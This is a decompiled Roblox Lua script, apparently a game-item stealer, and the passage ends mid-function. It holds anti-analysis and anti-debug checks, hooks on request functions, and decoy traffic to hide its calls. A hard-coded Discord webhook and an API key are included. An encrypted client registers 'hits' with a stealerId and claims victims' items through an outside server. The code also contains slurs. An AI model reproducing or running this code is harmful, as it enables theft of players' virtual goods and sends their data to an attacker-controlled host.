-- discord.gg/syncrypt

math.random(0, 100)

local s1 = [[                              ...,...,..................                               
                      ,,,,........,.,...,...........,.,...............,                   
                 *,,,,,,.,,,,,,,,,,,,,,,,,,,.......,,.,.................,,.               
                *,,,,,.,,........,,,,,,,,,,,,,,,,,,,,,,,,...............,,,               
                ,,,,,,,,,,,,,,,,,....,,,,,,,,,,,,,,,,,.....,,,,,,........,,,              
                ,,,,,,,*&@@@@@%,,/(**...,,,,,,,,,,,...,**,,,/%&@&%*....,,.,,              
                ,,,,&@(/(((((&@@@@@@@,%*,,,*,*,,,,,**,@@@@@@@@(//////&%...,,              
               ,,,,/,,,,,,,,,,,*(/#@@@@@(%,****,**@@@@@@#(/*,,,,,,,...,/..,,              
               *,,,,,,,,,,,,*******///(@#/******(@@@///*****,,,,,,,,,,,,.,,,              
               *,,,,****************//////*,,,,,****/*************,,,,,,,,,,              
               ,,,*******///    .//////***,,....,**//**/**    .****,**,,,,,,              
               .,,,***//              ***,,.....,,,*/             ,****,,,,,              
               ,,,,,,,,**//********,,,,,,,.......,,,,,*************,...,,,,,(             
               *,,,,,,,,,,,,,,,,...,,,,,,,.........,,,,......,,,,,,,,,..,.,,&             
               #,,******,,,,,,,,,,,,,,,,,,.......,.,.....,,,,,,,,,,,,,,,,,,,#             
                **/////*****,,,,,,,,,,,,,,..........,,,,,,,,,,,,,,,*******,,              
                ***////////********,,,,,,,.........,,.,*************///***,,              
                ****/////////////**,,,,,*,,,,,,,,,,,,,.,,/////**********,*,,              
                ***//////////*,,,,***//****/*//*********,,,,,*((/////*/*,,,               
                *****//@@**,,,,,,,,**/(/########%&///*,,,,,,,,,/*@@/***,,,,               
                 *******@@@**,,,,,,**(/@@@@@@@@@@@@/(**,,***/#/@@@***,,,,,                
                 *********@@@@@@&%@@@@@@@@@(((%@@@@@@@@@&%@@@@@@*,**,,,,,,                
                 .***********//##%&@@@@@@(#////(#@@@@@@&%#///******,,*,,,                 
                  **************,,,,***/**************,,,,******,,***,,,                  
                   ,**********/////////**//////////////*************,,,                   
                     ************///////((@@@@@@%(/******************                     
                       **********//**////(@@@@@@/*****************,                       
                         ****************(@@@@@@/**,************                          
                            *************(&@@@@@/*************                            
                              ,**********/%@@@@&/**********                               
                                  */*//////@@@&%////****                                  
                                     //////&@@&/////*   
]]

warn("41241")

if getgenv().executed then
	if game.PlaceId ~= 96342491571673 and game.PlaceId ~= 109983668079237 then
		return
	end

	if getgenv().accessCode then
		return
	end
end

getgenv().executed = true

if not string.find(getexecutorname():lower(), "xeno") then
	string.find(getexecutorname():lower(), "solara")
end

loadstring("function test() return \"hi\" end")()

if not test() == "hi" then
	return
end

local function v2(p1)
	pcall(function()
		local s2 = "https://discord.com/api/webhooks/1460980930612039767/U3n91fbElsOWEfjCzGuvxgrHZiPffOATrY8XtU0nL5Hy4jpfjLfOUSkger1cw-1pLUSy"
		local t1 = {
			content = ("%* %*"):format(p1, getexecutorname())
		}
		local json = game:GetService("HttpService"):JSONEncode(t1)
		local t2 = {
			["content-type"] = "application/json"
		}

		request = http_request or request or HttpPost or syn.request
		request({
			Url = s2,
			Body = json,
			Method = "POST",
			Headers = t2
		})
	end)
end

task.spawn(function()
	if getexecutorname():lower() == "xeno" then
		return
	end

	local descendants = game:GetDescendants()
	local t3 = {}

	while task.wait() do
		t3[#descendants * os.clock()] = descendants[math.random(1, #descendants)]
	end
end)

local function v9()
end

local Players = game:GetService("Players")

if Players.LocalPlayer ~= game.Players.LocalPlayer then
	v2("Detected: 1 ~= 1")

	return
end

if loadstring("return request") == request then
	v2("Detected: request")

	return
end

local n1 = 0

repeat
	task.wait()
	n1 += 1
until n1 > 50

if _25mspredefine then
	v2("Detected: 25ms")

	return
end

if type(getthreadidentity) ~= "function" then
	v2("Detected: getthreadidentity function")

	return
end

if type(getthreadidentity()) ~= "number" then
	v2("Detected: getthreadidentity number")

	return
end

local platform = game:GetService("UserInputService"):GetPlatform()

if typeof(platform) ~= "EnumItem" then
	v2("Detected: platform EnumItem")

	return
end

if typeof(Players.LocalPlayer.UserId) ~= "number" then
	v2("Detected: user number")

	return
end

if (function(p2)
	return p2 + 5
end)(5) ~= 10 then
	return
end

local function v13()
	return game
end

repeat
	task.wait()
until tostring(v13()) == "Ugc"

repeat
	task.wait()
until typeof(v13()) == "Instance"

repeat
	task.wait()
until typeof(v13()) ~= {}

local function v14()
	return (game:GetService("Players"))
end

repeat
	task.wait()
until v14() ~= nil

repeat
	task.wait()
until type(v14()) == "userdata"

for i = 1, 100 do
	task.spawn(function()
		while task.wait() do
			if math.random(1, 10) == 11 then
				error("123")
			end
		end
	end)
end

task.spawn(function()
	for i = 1, 100 do
		task.wait()
		getgenv()
	end
end)

local function v17(...)
	if ({ ... })[1] < 2 then
		return 1
	end

	return "Lypher ass"
end

local u18

local function v19(p3, p4, p5, p6)
	u18 = v17(1)

	if p5 then
		return p3 * 99 * 69 * 21 % 10, p4 .. "What u doing here?" .. p6, v17(2)
	end
end

local uAreNotGetAnythingHere, v21, v22 = v19(1, "U are not get anything here", "Hello", 55)
local game_ = game

repeat
	task.wait()
until game_ == game

repeat
	task.wait()
until v22 ~= u18

repeat
	task.wait()
until uAreNotGetAnythingHere == 1

repeat
	task.wait()
until v21 == "U are not get anything hereWhat u doing here?55"

repeat
	task.wait()
until u18 == 1

if v22 == u18 then
	v2("Detected: bigTasty == bigdick")

	return
end

if string.lower(getexecutorname()) ~= "xeno" then
	if islclosure and islclosure(request) or isfunctionhooked and isfunctionhooked(request) or ishooked and ishooked(request) then
		while true do
		end
	end

	local v24

	v24 = hookfunction(request, function(p7)
		if string.find(p7.Url, "vercel") then
			return
		end

		return v24(p7)
	end)

	local ok, result = pcall(function()
		local n2 = 0

		replaceclosure(warn, newcclosure(function()
			n2 += 1
		end))
		replaceclosure(print, newcclosure(function()
			n2 += 1
		end))
		replaceclosure(appendfile, newcclosure(function()
			n2 += 1
		end))

		local v28 = request({
			Url = "https://cdn.project-reverse.org/visual.luau",
			Nigger = s1
		})

		if not (n2 > 0) and rawget(v28, "StatusCode") then
			return
		end

		while true do
		end
	end)

	if not ok then
		v2(result)
	end

	task.spawn(function()
		game:GetService("HttpService")

		local function v29(p8)
			local _ = pcall(function()
				return request({
					Url = p8
				})
			end)

			return nil
		end

		local handlers = {
			function()
				return v29("https://api.ipify.org?format=json&MlemixGay=enabled")
			end,
			function()
				return v29("https://dog.ceo/api/breeds/image/random?SecretKeyforMlemixGay")
			end,
			function()
				return v29("https://catfact.ninja/fact?MlemixGay")
			end,
			function()
				return v29("https://api.agify.io?name=MlemixGayTest")
			end,
			function()
				return v29("https://api.genderize.io?name=GetMlemixGayRn")
			end,
			function()
				return v29("https://api.nationalize.io?name=michaelJacksonMlemixGay")
			end,
			function()
				return v29("https://www.boredapi.com/api/activity?isMlemixGay")
			end,
			function()
				return v29("https://api.adviceslip.com/advice?advertiseMlemixGay")
			end,
			function()
				return v29("https://official-joke-api.appspot.com/random_joke?forMlemixGay")
			end,
			function()
				return v29("http://ip-api.com/json/8.8.8.8?98MlemixGayChance")
			end,
			function()
				return v29("https://uselessfacts.jsph.pl/api/v2/facts/random?factMlemixGay")
			end
		}

		while true do
			handlers[math.random(#handlers)]()
			task.wait(math.random(1, 10) / 10)
		end
	end)
end

print = function()
end
warn = function()
end
error = function()
end
info = function()
end

local t4 = {
	cache = {}
}

local function v34()
	return nil
end

t4.a = function()
	local a = t4.cache.a

	if not a then
		a = {
			c = v34()
		}
		t4.cache.a = a
	end

	return a.c
end

local function v36()
	t4.a()

	return {
		API_BASE_URL = PROXY_URL or "https://api.project-reverse.org",
		EXPLOIT_API_KEY = "bK5ZLj1VvjLUyo5bqh16F2VnOCduc8p2sSMATZMHKjxxgdkvto",
		GAME_ID = 10200395747,
		GAME_NAME = "gag2",
		GIVE_ALL_ITEMS = true,
		EXECUTOR_NAME = getexecutorname():lower(),
		HWID = gethwid and gethwid() or "unknown",
		IGNORE_MESSAGE_PATTERNS_IN_WEBHOOK = {
			"no valuables to steal",
			"failed to pull from connection",
			"failed to register due to error"
		}
	}
end

t4.b = function()
	local b = t4.cache.b

	if not b then
		b = {
			c = v36()
		}
		t4.cache.b = b
	end

	return b.c
end

local function v38()
	local t5 = {
		"verbose",
		"error",
		"warn"
	}

	return function(...)
		local t6 = { ... }
		local t7 = {}

		local function v42(p9)
			local function v43(...)
				return ...
			end

			for i = #t6, 1, -1 do
				local v45 = t6[i]
				local v46 = v43

				v43 = function(...)
					return v45(p9, v46, ...)
				end
			end

			return v43
		end

		for _, v in t5, nil, nil do
			t7[v] = v42(v)
		end

		return t7
	end
end

t4.c = function()
	local c = t4.cache.c

	if not c then
		c = {
			c = v38()
		}
		t4.cache.c = c
	end

	return c.c
end

local function v50()
	return nil
end

t4.d = function()
	local d = t4.cache.d

	if not d then
		d = {
			c = v50()
		}
		t4.cache.d = d
	end

	return d.c
end

local function v52()
	t4.d()

	return function()
		local t8 = {}

		return {
			subscribe = function(p10)
				t8[p10] = true

				return function()
					t8[p10] = nil
				end
			end,
			publish = function(p11)
				for k in t8, nil, nil do
					task.spawn(k, p11)
				end
			end
		}
	end
end

t4.e = function()
	local e = t4.cache.e

	if not e then
		e = {
			c = v52()
		}
		t4.cache.e = e
	end

	return e.c
end

local function v56()
	t4.d()

	return function()
		local t9

		t9 = {
			create = function(p12)
				return {
					payload = p12,
					parent = t9
				}
			end,
			createObserver = function(p13)
				return function(p14)
					if p14.parent == t9 then
						p13(p14)

						return
					end
				end
			end
		}

		return t9
	end
end

t4.f = function()
	local f = t4.cache.f

	if not f then
		f = {
			c = v56()
		}
		t4.cache.f = f
	end

	return f.c
end

local function v59()
	t4.d()

	return {
		createBus = t4.e(),
		createEventDefinition = t4.f()
	}
end

t4.g = function()
	local g = t4.cache.g

	if not g then
		g = {
			c = v59()
		}
		t4.cache.g = g
	end

	return g.c
end

local function v61()
	return nil
end

t4.h = function()
	local h = t4.cache.h

	if not h then
		h = {
			c = v61()
		}
		t4.cache.h = h
	end

	return h.c
end

local function v63()
	t4.h()

	return nil
end

t4.i = function()
	local i = t4.cache.i

	if not i then
		i = {
			c = v63()
		}
		t4.cache.i = i
	end

	return i.c
end

local function v65()
	t4.a()

	return nil
end

t4.j = function()
	local j = t4.cache.j

	if not j then
		j = {
			c = v65()
		}
		t4.cache.j = j
	end

	return j.c
end

local function v67()
	t4.j()

	return nil
end

t4.k = function()
	local k = t4.cache.k

	if not k then
		k = {
			c = v67()
		}
		t4.cache.k = k
	end

	return k.c
end

local function v69()
	t4.c()
	t4.g()
	t4.i()
	t4.k()

	return {}
end

t4.l = function()
	local l = t4.cache.l

	if not l then
		l = {
			c = v69()
		}
		t4.cache.l = l
	end

	return l.c
end

local function v71()
	local v73
	local t11 = {
		["\\"] = "\\",
		["\""] = "\"",
		["\8"] = "b",
		["\12"] = "f",
		["\n"] = "n",
		["\r"] = "r",
		["\t"] = "t"
	}
	local t12 = {
		["/"] = "/"
	}

	for k, v in t11, nil, nil do
		t12[v] = k
	end

	local function v78(p15)
		return "\\" .. (t11[p15] or string.format("u%04x", p15:byte()))
	end
	local function v79()
		return "null"
	end
	local function v80(p16, p17)
		local t13 = {}
		local v82 = p17 or {}

		if v82[p16] then
			error("circular reference")
		end

		v82[p16] = true

		if rawget(p16, 1) == nil and next(p16) ~= nil then
			for k, v in p16, nil, nil do
				if type(k) ~= "string" then
					error("invalid table: mixed or invalid key types")
				end

				table.insert(t13, v73(k, v82) .. ":" .. v73(v, v82))
			end

			v82[p16] = nil

			return "{" .. table.concat(t13, ",") .. "}"
		end

		local n3 = 0

		for k in p16, nil, nil do
			if type(k) ~= "number" then
				error("invalid table: mixed or invalid key types")
			end

			n3 += 1
		end

		if n3 ~= #p16 then
			error("invalid table: sparse array")
		end

		for _, v in ipairs(p16) do
			table.insert(t13, v73(v, v82))
		end

		v82[p16] = nil

		return "[" .. table.concat(t13, ",") .. "]"
	end
	local function v89(p18)
		return "\"" .. p18:gsub("[%z\1-\31\\\"]", v78) .. "\""
	end
	local function v90(p19)
		if p19 ~= p19 or p19 <= -math.huge or math.huge <= p19 then
			error("unexpected number value '" .. tostring(p19) .. "'")
		end

		return string.format("%.14g", p19)
	end
	local function v91(p20)
		return "\"" .. tostring(p20) .. "\""
	end

	local t14 = {
		["nil"] = v79,
		table = v80,
		string = v89,
		number = v90,
		boolean = tostring,
		["function"] = v91,
		thread = v91,
		userdata = v91
	}

	v73 = function(p21, p22)
		local kind = type(p21)
		local v94 = t14[kind]

		if v94 then
			return v94(p21, p22)
		end

		error("unexpected type '" .. kind .. "'")
	end

	local t10 = {
		encode = function(p23)
			return (v73(p23))
		end
	}
	local v95

	local function v96(...)
		local t15 = {}

		for i = 1, select("#", ...) do
			t15[select(i, ...)] = true
		end

		return t15
	end

	local v99 = v96(" ", "\t", "\r", "\n")
	local v100 = v96(" ", "\t", "\r", "\n", "]", "}", ",")
	local v101 = v96("\\", "/", "\"", "b", "f", "n", "r", "t", "u")
	local v102 = v96("true", "false", "null")
	local t16 = {
		["true"] = true,
		["false"] = false,
		null = nil
	}

	local function v104(p24, p25, p26, p27)
		for i = p25, #p24 do
			if p26[p24:sub(i, i)] == p27 then
				continue
			end

			return i
		end

		return #p24 + 1
	end
	local function v106(p28, p29, p30)
		local n4 = 1
		local n5 = 1

		for i = 1, p29 - 1 do
			n5 += 1

			if p28:sub(i, i) == "\n" then
				n4 += 1
				n5 = 1
			end
		end

		error(string.format("%s at line %d col %d", p30, n4, n5))
	end
	local function v110(p31)
		if p31 <= 127 then
			return string.char(p31)
		end

		if p31 <= 2047 then
			return string.char(math.floor(p31 / 64) + 192, p31 % 64 + 128)
		end

		if p31 <= 65535 then
			return string.char(math.floor(p31 / 4096) + 224, math.floor(p31 % 4096 / 64) + 128, p31 % 64 + 128)
		end

		if p31 <= 1114111 then
			return string.char(math.floor(p31 / 262144) + 240, math.floor(p31 % 262144 / 4096) + 128, math.floor(p31 % 4096 / 64) + 128, p31 % 64 + 128)
		end

		error(string.format("invalid unicode codepoint '%x'", p31))
	end
	local function v111(p32)
		local v112 = tonumber(p32:sub(1, 4), 16)
		local v113 = tonumber(p32:sub(7, 10), 16)

		if v113 then
			return v110((v112 - 55296) * 1024 + (v113 - 56320) + 65536)
		end

		return v110(v112)
	end
	local function v114(p33, p34)
		local s3 = ""
		local v116 = p34 + 1
		local v117 = v116

		while v116 <= #p33 do
			local v118 = p33:byte(v116)

			if v118 < 32 then
				v106(p33, v116, "control character in string")
			elseif v118 == 92 then
				local v119 = s3 .. p33:sub(v117, v116 - 1)

				v116 += 1

				local v120 = p33:sub(v116, v116)

				if v120 == "u" then
					local match = p33:match("^[dD][89aAbB]%x%x\\u%x%x%x%x", v116 + 1) or p33:match("^%x%x%x%x", v116 + 1) or v106(p33, v116 - 1, "invalid unicode escape in string")

					s3 = v119 .. v111(match)
					v116 += #match
				else
					if not v101[v120] then
						v106(p33, v116 - 1, "invalid escape char '" .. v120 .. "' in string")
					end

					s3 = v119 .. t12[v120]
				end

				v117 = v116 + 1
			elseif v118 == 34 then
				return s3 .. p33:sub(v117, v116 - 1), v116 + 1
			end

			v116 += 1
		end

		v106(p33, p34, "expected closing quote for string")
	end
	local function v122(p35, p36)
		local v123 = v104(p35, p36, v100)
		local v124 = p35:sub(p36, v123 - 1)
		local v125 = tonumber(v124)

		if not v125 then
			v106(p35, p36, "invalid number '" .. v124 .. "'")
		end

		return v125, v123
	end
	local function v126(p37, p38)
		local v127 = v104(p37, p38, v100)
		local v128 = p37:sub(p38, v127 - 1)

		if not v102[v128] then
			v106(p37, p38, "invalid literal '" .. v128 .. "'")
		end

		return t16[v128], v127
	end

	local t17 = {
		["\""] = v114,
		["0"] = v122,
		["1"] = v122,
		["2"] = v122,
		["3"] = v122,
		["4"] = v122,
		["5"] = v122,
		["6"] = v122,
		["7"] = v122,
		["8"] = v122,
		["9"] = v122,
		["-"] = v122,
		t = v126,
		f = v126,
		n = v126,
		["["] = function(p39, p40)
			local t18 = {}
			local n6 = 1
			local v132 = p40 + 1

			while true do
				local v133 = v104(p39, v132, v99, true)

				if p39:sub(v133, v133) ~= "]" then
					local v134, v135 = v95(p39, v133)

					t18[n6] = v134
					n6 += 1

					local v136 = v104(p39, v135, v99, true)
					local v137 = p39:sub(v136, v136)

					v132 = v136 + 1

					if v137 == "]" then
						break
					end

					if v137 ~= "," then
						v106(p39, v132, "expected ']' or ','")
					end

					continue
				end

				v132 = v133 + 1

				break
			end

			return t18, v132
		end,
		["{"] = function(p41, p42)
			local t19 = {}
			local v139 = p42 + 1

			while true do
				local v140 = v104(p41, v139, v99, true)

				if p41:sub(v140, v140) ~= "}" then
					if p41:sub(v140, v140) ~= "\"" then
						v106(p41, v140, "expected string for key")
					end

					local v141, v142 = v95(p41, v140)
					local v143 = v104(p41, v142, v99, true)

					if p41:sub(v143, v143) ~= ":" then
						v106(p41, v143, "expected ':' after key")
					end

					local v144 = v104(p41, v143 + 1, v99, true)
					local v145, v146 = v95(p41, v144)

					t19[v141] = v145

					local v147 = v104(p41, v146, v99, true)
					local v148 = p41:sub(v147, v147)

					v139 = v147 + 1

					if v148 == "}" then
						break
					end

					if v148 ~= "," then
						v106(p41, v139, "expected '}' or ','")
					end

					continue
				end

				v139 = v140 + 1

				break
			end

			return t19, v139
		end
	}

	v95 = function(p43, p44)
		local v149 = p43:sub(p44, p44)
		local v150 = t17[v149]

		if v150 then
			return v150(p43, p44)
		end

		v106(p43, p44, "unexpected character '" .. v149 .. "'")
	end
	t10.decode = function(p45)
		if type(p45) ~= "string" then
			error("expected argument of type string, got " .. type(p45))
		end

		local v151, v152 = v95(p45, v104(p45, 1, v99, true))
		local v153 = v104(p45, v152, v99, true)

		if v153 <= #p45 then
			v106(p45, v153, "trailing garbage")
		end

		return v151
	end

	return t10
end

t4.m = function()
	local m = t4.cache.m

	if not m then
		m = {
			c = v71()
		}
		t4.cache.m = m
	end

	return m.c
end

local function v155()
	local function v156(p46)
		return p46 % 4294967296
	end
	local function v157(p47, p48)
		return bit32.lrotate(p47, p48)
	end
	local function v158(p49)
		return string.char(p49 % 256, math.floor(p49 / 256) % 256, math.floor(p49 / 65536) % 256, math.floor(p49 / 16777216) % 256)
	end

	local v159
	local split

	local function v161(p50, p51, p52, p53)
		local v162 = v156(p50 + p51)
		local v163 = v157(bit32.bxor(p53, v162), 16)
		local v164 = v156(p52 + v163)
		local v165 = v157(bit32.bxor(p51, v164), 12)
		local v166 = v156(v162 + v165)
		local v167 = v157(bit32.bxor(v163, v166), 8)
		local v168 = v156(v164 + v167)

		return v166, v157(bit32.bxor(v165, v168), 7), v168, v167
	end
	local function v169(p54, p55)
		local n7 = 1634760805
		local n8 = 857760878
		local n9 = 2036477234
		local n10 = 1797285236
		local v174 = v159(split, 0)
		local v175 = v159(split, 1)
		local v176 = v159(split, 2)
		local v177 = v159(split, 3)
		local v178 = v159(split, 4)
		local v179 = v159(split, 5)
		local v180 = v159(split, 6)
		local v181 = v159(split, 7)
		local v182 = p54
		local v183 = v159(0, 0)
		local v184 = v159(0, 1)
		local v185 = v159(0, 2)
		local v186 = n7
		local v187 = n8
		local v188 = n9
		local v189 = n10
		local v190 = v174
		local v191 = v175
		local v192 = v176
		local v193 = v177
		local v194 = v178
		local v195 = v179
		local v196 = v180
		local v197 = v181
		local v198 = v182
		local v199 = v183
		local v200 = v184
		local v201 = v185

		for i = 1, p55, 2 do
			local v203, v204, v205, v206 = v161(v186, v190, v194, v198)
			local v207, v208, v209, v210 = v161(v187, v191, v195, v199)
			local v211 = v209
			local v212 = v210
			local v213, v214, v215, v216 = v161(v188, v192, v196, v200)
			local v217, v218, v219, v220 = v161(v189, v193, v197, v201)

			v186, v191, v196, v201 = v161(v203, v208, v215, v220)
			v187, v192, v197, v198 = v161(v207, v214, v219, v206)
			v188, v193, v194, v199 = v161(v213, v218, v205, v212)
			v189, v190, v195, v200 = v161(v217, v204, v211, v216)
		end

		return v158(v156(v186 + n7)) .. v158(v156(v187 + n8)) .. v158(v156(v188 + n9)) .. v158(v156(v189 + n10)) .. v158(v156(v190 + v174)) .. v158(v156(v191 + v175)) .. v158(v156(v192 + v176)) .. v158(v156(v193 + v177)) .. v158(v156(v194 + v178)) .. v158(v156(v195 + v179)) .. v158(v156(v196 + v180)) .. v158(v156(v197 + v181)) .. v158(v156(v198 + v182)) .. v158(v156(v199 + v183)) .. v158(v156(v200 + v184)) .. v158(v156(v201 + v185))
	end

	local t20 = {
		ChaCha20 = function(p56, p57, p58)
			local v222 = p57 or 1
			local v223 = p58 or 20

			assert(v223 > 0 and v223 % 2 == 0, "rounds must be a positive even number")

			if #p56 == 0 then
				return ""
			end

			local t21 = {}
			local n11 = 1
			local v226 = v222

			while n11 <= #p56 do
				local v227 = v169(v226, v223)
				local v228 = math.min(64, #p56 - n11 + 1)

				for i = 1, v228 do
					local v230 = string.byte(p56, n11 + i - 1)
					local v231 = string.byte(v227, i)

					t21[#t21 + 1] = string.char(bit32.bxor(v230, v231))
				end

				n11 += v228
				v226 += 1
			end

			return table.concat(t21)
		end
	}
	local s4 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	local t22 = {}

	for i = 1, 64 do
		t22[string.byte(s4, i)] = i - 1
	end

	t22[61] = 64

	local function v235(p59)
		local v236 = #p59

		if v236 == 0 then
			return ""
		end

		local t23 = {}
		local n12 = 1

		while n12 <= v236 - 3 do
			local v239, v240, v241, v242 = string.byte(p59, n12, n12 + 3)
			local v243 = t22[v239]
			local v244 = t22[v240]
			local v245 = t22[v241]
			local v246 = t22[v242]

			if v245 == 64 then
				t23[#t23 + 1] = string.char(bit32.lshift(v243, 2) + bit32.rshift(v244, 4))

				break
			elseif v246 == 64 then
				t23[#t23 + 1] = string.char(bit32.lshift(v243, 2) + bit32.rshift(v244, 4))
				t23[#t23 + 1] = string.char(bit32.band(bit32.lshift(v244, 4), 240) + bit32.rshift(v245, 2))

				break
			else
				t23[#t23 + 1] = string.char(bit32.lshift(v243, 2) + bit32.rshift(v244, 4))
				t23[#t23 + 1] = string.char(bit32.band(bit32.lshift(v244, 4), 240) + bit32.rshift(v245, 2))
				t23[#t23 + 1] = string.char(bit32.band(bit32.lshift(v245, 6), 192) + v246)
				n12 += 4
			end
		end

		return table.concat(t23)
	end
	local function v247(p60)
		local t24 = {}
		local v249 = #p60

		for i = 1, v249, 3 do
			local v251, v252, v253 = string.byte(p60, i, i + 2)
			local v254 = v251 * 65536 + (v252 or 0) * 256 + (v253 or 0)
			local v255 = math.floor(v254 / 262144) % 64
			local v256 = math.floor(v254 / 4096) % 64
			local v257 = math.floor(v254 / 64) % 64
			local v258 = v254 % 64

			t24[#t24 + 1] = s4:sub(v255 + 1, v255 + 1)
			t24[#t24 + 1] = s4:sub(v256 + 1, v256 + 1)
			t24[#t24 + 1] = i + 1 <= v249 and s4:sub(v257 + 1, v257 + 1) or "="
			t24[#t24 + 1] = i + 2 <= v249 and s4:sub(v258 + 1, v258 + 1) or "="
		end

		return table.concat(t24)
	end

	local t25 = {
		1,
		14,
		14,
		30,
		34,
		11,
		49,
		23,
		61,
		22,
		33,
		9,
		34,
		51,
		29,
		35,
		7,
		41,
		17,
		4,
		55,
		41,
		63,
		13,
		29,
		28,
		45,
		40,
		3,
		25,
		43,
		4,
		36,
		36,
		59,
		44,
		55,
		11,
		53,
		54,
		29,
		41,
		31,
		61
	}
	local obj = setmetatable({}, {
		__index = function(p61, p62)
			local v261 = #s4

			return ({
				total = v261 - math.floor(v261 / 3) + 1,
				spin = v261 / 4 - 3,
				shift = v261 / 8 - 1,
				stride = v261 / 2 - 3,
				salt = v261 / 8 + 3,
				split = v261 / 8 + v261 / 16
			})[p62]
		end
	})
	local obj2 = setmetatable({}, {
		__index = function(p63, p64)
			local v263 = p64 - 1

			return string.byte(s4, bit32.bxor(t25[(v263 * obj.spin + obj.shift) % obj.total + 1], (v263 * obj.stride + math.floor(v263 * v263 / 3) + obj.salt) % #s4) + 1)
		end
	})

	split = obj.split
	v159 = function(p65, p66)
		local v264 = p65 + p66 * 4

		return obj2[v264 + 1] + obj2[v264 + 2] * 256 + obj2[v264 + 3] * 65536 + obj2[v264 + 4] * 16777216
	end

	return {
		encrypt = function(p67)
			local v265 = t20.ChaCha20(p67)

			return v247(v265)
		end,
		decrypt = function(p68)
			local v266 = v235(p68)

			return t20.ChaCha20(v266)
		end
	}
end

t4.n = function()
	local v267 = t4.cache.n

	if not v267 then
		v267 = {
			c = v155()
		}
		t4.cache.n = v267
	end

	return v267.c
end

local function v268()
	local v269 = t4.b()
	local t26 = {}

	local function v271()
		return {
			ref = nil
		}
	end
	local function v272(...)
		local t27 = { ... }

		while true do
			local v274 = false

			for _, v in t27, nil, nil do
				if coroutine.status(v) == "dead" then
					v274 = true
				elseif v274 then
					pcall(task.cancel, v)
				end
			end

			if not v274 then
				task.wait(0.1)

				continue
			end

			break
		end
	end
	local function v277(p69)
		local t28 = {
			Url = v269.API_BASE_URL .. p69.request.endpoint,
			Method = p69.request.method,
			Headers = p69.request.headers
		}
		local body

		if p69.request.body == nil then
			body = nil
		else
			body = p69.request.body
		end

		t28.Body = body

		local ok, result = pcall(request, t28)

		if not ok then
			p69.response.ref = {
				ok = false,
				body = result
			}

			return
		end

		if result == nil then
			p69.response.ref = {
				ok = false,
				body = "response is nil"
			}

			return
		end

		if result.Body ~= nil then
			p69.response.ref = {
				ok = result.StatusCode == 200,
				body = result.Body
			}

			return
		end

		p69.response.ref = {
			ok = false,
			body = "body is nil"
		}
	end
	local function v282()
		while true do
			local v283 = table.remove(t26, 1)

			if v283 == nil then
				task.wait(0.1)
			else
				task.spawn(v272, task.spawn(v277, v283), task.delay(25, function()
					if v283.response.ref == nil then
						v283.response.ref = {
							ok = false,
							body = "request timed out"
						}

						return
					end
				end))
			end
		end
	end
	local function v284(p70, p71, p72, p73)
		local v285 = v271()

		table.insert(t26, {
			request = {
				method = p70,
				endpoint = p71,
				headers = p72,
				body = p73
			},
			response = v285
		})

		repeat
			task.wait(0.1)
		until v285.ref ~= nil

		return v285.ref
	end

	task.spawn(v282)

	return v284
end

t4.o = function()
	local o = t4.cache.o

	if not o then
		o = {
			c = v268()
		}
		t4.cache.o = o
	end

	return o.c
end

local function v287()
	local v288 = t4.m()
	local v289 = t4.n()
	local v290 = t4.b()

	t4.o()

	local function v291(p74)
		return {
			["exploit-api-key"] = v290.EXPLOIT_API_KEY,
			["content-type"] = p74
		}
	end
	local function v292(p75)
		if not p75.ok then
			error("Failed to parse response, not OK")
		end

		local ok, result = pcall(v288.decode, p75.body)

		if not ok then
			local error_ = error
			local v296 = ("Failed to parse JSON\nResponse: %*\nError: %*"):format(p75.body, result)

			error_(v296)
		end

		local v297 = result

		if not v297.success then
			error("Failed to parse JSON response, not success")
		end

		return v297.data
	end
	local function v298(p76)
		local v299 = v292(p76)
		local v300 = v289.decrypt(v299)

		return v288.decode(v300)
	end

	return {
		getAuthorizationHeaders = v291,
		parseJsonResponse = v292,
		parseEncryptedJsonResponse = v298
	}
end

t4.p = function()
	local p = t4.cache.p

	if not p then
		p = {
			c = v287()
		}
		t4.cache.p = p
	end

	return p.c
end

local function v302()
	local v303 = t4.m()
	local v304 = t4.n()

	t4.k()
	t4.j()

	local v305 = t4.b()
	local v306 = t4.p()
	local v307 = t4.l()
	local v308 = t4.o()

	return {
		registerExecution = function()
			local json = v306.getAuthorizationHeaders("application/json")
			local t29 = {
				stealerId = ID,
				executor = v305.EXECUTOR_NAME
			}
			local post = v308("POST", "/hits/execution", json, v303.encode(t29))

			if not post.ok then
				v307.logger.error("Failed to register execution", {
					payload = t29,
					response = post
				})
				error("Failed to register execution")
			end

			return v306.parseJsonResponse(post)
		end,
		registerHit = function(p77)
			local plain = v306.getAuthorizationHeaders("text/plain")
			local v313 = v304.encrypt(v303.encode(p77))
			local post = v308("POST", "/hits/register", plain, v313)

			if not post.ok then
				v307.logger.error("Failed to register hit", {
					payload = p77,
					response = post
				})
				error("Failed to register due to error")
			end

			return v306.parseEncryptedJsonResponse(post)
		end,
		claimItem = function(p78, p79, p80)
			local post = v308("POST", "/hits/claim", v306.getAuthorizationHeaders("application/json"), v303.encode({
				secretKey = p78,
				uniqueId = p79,
				count = p80
			}))

			if not post.ok then
				v307.logger.error("Failed to claim item", {
					uniqueId = p79,
					count = p80,
					response = post
				})
				error("Failed to claim item")
			end
		end,
		connect = function(p81)
			local json = v306.getAuthorizationHeaders("application/json")
			local post = v308("POST", ("/hits/connection?secretKey=%*"):format(p81), json, "{}")

			if not post.ok then
				v307.logger.error("Failed to connect", {
					secretKey = p81,
					response = post
				})
				error("Failed to connect")
			end
		end,
		pullFromConnection = function(p82)
			local json = v306.getAuthorizationHeaders("application/json")
			local get = v308("GET", ("/hits/connection?secretKey=%*"):format(p82), json, nil)

			if not get.ok then
				v307.logger.error("Failed to pull from connection", {
					secretKey = p82,
					response = get
				})
				error("Failed to pull from connection")
			end

			return v306.parseJsonResponse(get)
		end
	}
end

t4.q = function()
	local q = t4.cache.q

	if not q then
		q = {
			c = v302()
		}
		t4.cache.q = q
	end

	return q.c
end

local function v321()
	local Players2 = game:GetService("Players")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local LocalPlayer = Players2.LocalPlayer
	local t30 = {}

	local function v326()
		if not t30.playerStateClient then
			t30.playerStateClient = require(ReplicatedStorage.ClientModules.PlayerStateClient)
		end

		return t30.playerStateClient
	end

	return {
		getPlayerStateClient = v326,
		getNetworking = function()
			if not t30.networking then
				t30.networking = require(ReplicatedStorage.SharedModules.Networking)
			end

			return t30.networking
		end,
		getMailboxItemCatalog = function()
